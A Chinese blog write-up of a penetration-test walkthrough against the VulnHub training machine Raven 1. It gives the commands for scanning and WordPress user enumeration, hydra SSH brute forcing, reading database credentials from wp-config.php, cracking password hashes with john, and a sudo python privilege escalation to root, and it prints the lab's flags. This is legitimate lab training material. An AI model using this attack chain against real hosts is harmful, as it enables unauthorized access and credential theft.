---
title: "vulnhub靶机渗透RAVEN1"
onlyTitle: true
date: 2023-06-27 13:05:36
categories:
- 内网渗透
- 靶机
tags:
- 内网渗透
- vulnhub
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B872.jpg
---



# Raven 1

## 一、有效资产收集

| 资产编号 | 资产分类 | 资产名称       | 资产规格                                                     | 访问地址        | 备注/问题                                                    |
| -------- | -------- | -------------- | ------------------------------------------------------------ | --------------- | ------------------------------------------------------------ |
| Raven1   | 主机系统 | Ubuntu操作系统 | Type:Linux<br />IP:192.168.101.135<br />Port:22、80、111、40695 | 192.168.101.135 | openSSH版本较低导致的用户枚举和栈溢出，wordpress存在敏感信息泄露 |

flag：

==flag1{b9bbcb33e11b80be759c4e844862482d}==

==flag2{fc3fd58dcdad9ab23faca6e9a36e581c}==

==flag3{afc01ab56b50591e7dccf93122770cd2}==

==flag4{715dea6c055b9fe3337544932f2941ce}==

靶机下载地址：https://www.vulnhub.com/entry/raven-1,256/

## 二、渗透测试过程

kali攻击机ip为192.168.101.128

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png)

### 1. 信息收集

* 通过netdiscover进行二层发现，发现地址为192.168.101.135主机

> 其他几个主机分别代表：
>
> * 192.168.101.1 物理机
> * 192.168.101.2 网关
> * 192.168.101.254 DHCP服务器

```sh
netdiscover -r 192.168.101.0/24
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626141708005.png)

* 通过ping进行三层发现，根据ttl=64初步推测该主机为Linux

```sh
ping 192.168.101.135
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626141742326.png)

* 通过masscan四层发现目标主机开放端口

```sh
masscan -p0-65535 --rate=10000 192.168.101.135
```

> masscan：高速端口扫描工具。参数如下：
>
> * -p:指定要扫描的端口范围，可以是单个端口如-p80,443或者多个端口-p1-65535
> * --rate:指定扫描速率，即每秒扫描多少个端口，默认速率10000
> * -iL：指定要扫描的IP地址列表，可以是一个文件，也可以是一个逗号分隔的IP地址列表
> * -oL：指定输出扫描结果的文件名，可以是一个文件，也可以是一个目录

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142033498.png)

目标主机开启了80web服务端口，40695端口，111端口



* 扫描目标端口服务

  ```sh
  nmap -A -p- -sC -T4 -sS -P0 192.168.101.135 -oN nmap.A
  ```

  > * -A   使用操作系统检测、版本检测等选项
  > * -p-   扫描目标主机所有端口(1-65535)
  > * -sC   使用默认的Nmap脚本扫描
  > * -T4  设置扫描速度为"快"
  > * -sS   使用SYN扫描(半开放扫描)
  > * -P0   禁用ping，不进行主机存活扫描
  > * -oN nmap.A   将扫描结果输出到文件"nmap.A"中，格式为正常输出

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142129520.png)

* 目标开启了以下端口及服务：
  * 22端口，服务为OpenSSH 6.7p1;且系统为Debian 5 +deb8u4
  * 80端口，服务为Apacha 2.4.10
  * 111端口，服务为rpcbind
  * 40695端口，服务为rpc



使用Nmap中漏洞分类NSE脚本对目标进行探测

```sh
nmap -sV --script vuln 192.168.101.135
```

****

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142416004.png)

可以看到有很多现成的CVE可以用



对网站进行指纹识别：

```sh
whatweb 192.168.101.135
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142445620.png)

没有有效的web服务信息



在exploit-db上搜索ssh对应版本的漏洞，或者searchspolit，目标服务器的openssh有用户名枚举漏洞

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625210618990.png)



seebug上看到目标主机存在信息泄露和缓冲区溢出漏洞，还有2010年的拒绝服务漏洞（因该漏洞等级较低，实施拒绝服务也较困难所以无视）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214035684.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214249208.png)

==192.168.101.135主机的22端口存在信息泄露和缓冲区溢出漏洞，seebug还有searchspolit都能找到对应的poc，该轮信息扫描可以用来进行下一步的ssh爆破或溢出漏洞攻击。该信息泄露漏洞定义为中危==

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230625214826294.png)



访问其web服务：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142536853.png)

在其service.html源码里找到flag1:

==flag1{b9bbcb33e11b80be759c4e844862482d}==

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626151243145.png)



* 目录扫描：

```sh
dirb 192.168.101.135
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142852924.png)

目标网站存在vendor目录，访问一下，发现存在敏感目录遍历

> vendor目录一般是指在项目中用于存放第三方库、框架、插件等外部依赖的目录。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143148450.png)



还有wordpress目录，该站应该是一个wordpress的框架

* wappalzer分析：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626143024979.png)



在目录可以看到使用了PGPMailer(功能齐全的PHP电子邮件创建和传输类)



VERSION目录找到了PHPMailer版本号为5.2.16

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626145333475.png)

进入到BLOG，看到wordpress网站后台登录入口：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626151644306.png)

点击之后，会跳转到`http://raven.local/wordpress/wp-login.php`。但是无法连接到raven.local，考虑是dns解析错误。添加域名到hosts文件

* 编辑hosts文件，使raven.local解析到靶机ip，写完之后清除一下dns缓存

```
192.168.101.135 raven.local
```

```sh
ipconfig /flushdns
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153057034.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153223672.png)

### 2. 漏洞扫描

#### WPscan工具

用WPscan来探测WordPress的漏洞，暴力枚举用户名：

```sh
wpscan --url http://192.168.101.135/wordpress/ -eu
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153736259.png)

爆破到了两个用户名，分别是：`michael`	`steven`



#### hydra工具暴力破解

把这两个用户名写入user.txt，用hydra进行密码爆破登录SSH:

kali本身有自带的密码字典：rockyou

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626154210867.png)

```sh
gzip -d /usr/share/wordlists/rockyou.txt.gz
cp /usr/share/wordlists/rockyou.txt pass
hydra -L user.txt -P pass 192.168.101.135 ssh
```



ssh的用户michael密码为michael：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626154904128.png)





#### 尝试进行ssh登录：

```sh
ssh michael@192.168.101.135
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626155252966.png)

ssh登录成功，获得低权限shell



### 3. 漏洞利用

* find命令寻找flag2:

```sh
find / -name *flag* 2>/dev/null
```

> 这个命令的作用是在Linux系统中查找文件名中包含“flag”字符串的文件，并将结果输出到控制台。
>
> * 从根目录查找
> * `*`为通配符，表示文件名中含有flag字符串
> * 2为错误输出，/dev/null特殊设备用于丢弃所有数据。`2>/dev/null`表示忽略所有错误信息

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626155524561.png)

找到flag2:==flag2{fc3fd58dcdad9ab23faca6e9a36e581c}==

#### 登录Mysql

查看Mysql是否在运行

```sh
ps -ef | grep mysql
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160053324.png)



切换到wordpress目录，发现config配置文件：

```sh
cd /var/www/html/wordpress
cat wp-config.php
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160527025.png)

找到数据库账号root，密码R@v3nSecurity。Mysql登录

```sh
mysql -u root -p
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160628125.png)



查看mysql数据库：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160758564.png)

获取数据库的flag3，flag4：

在wordpress.wp_posts里面找到了flag3和flag4

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626161015000.png)

==flag3{afc01ab56b50591e7dccf93122770cd2}==

==flag4{715dea6c055b9fe3337544932f2941ce}==



#### 数据库提权

在wordpress.wp_users里找到了两组数据库账号和密码

用户名分别为`michael`和`steven`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626161341869.png)

密码加密后如下：

```
michael:$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0
steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/
```



* john解密：

把上面`steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/`写进1.txt，使用john工具解密：

```sh
john 1.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162424167.png)

找到steven密码pink84



#### 提权

使用**python pty提权**

```sh
sudo python -c 'import pty; pty.spawn("/bin/bash");'
```

michael用户进行python提权时，由于michael用户没有被赋予sudo执行python的权限，所以提权失败，并且该事件还被记录了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162718424.png)



ssh登录steven之后再尝试提权：

```sh
ssh steven@192.168.101.135
sudo python -c 'import pty; pty.spawn("/bin/bash");'
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162930601.png)

steven是具有python sudo权限的，在sudoers里存在：

```sh
steven ALL=(ALL) NOPASSWD: /usr/bin/python
```

授予普通用户以root权限执行Python脚本（实战用不了一点）



用find命令或者直接找，在~目录下也能找到flag4

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626163116227.png)



本次渗透测试完毕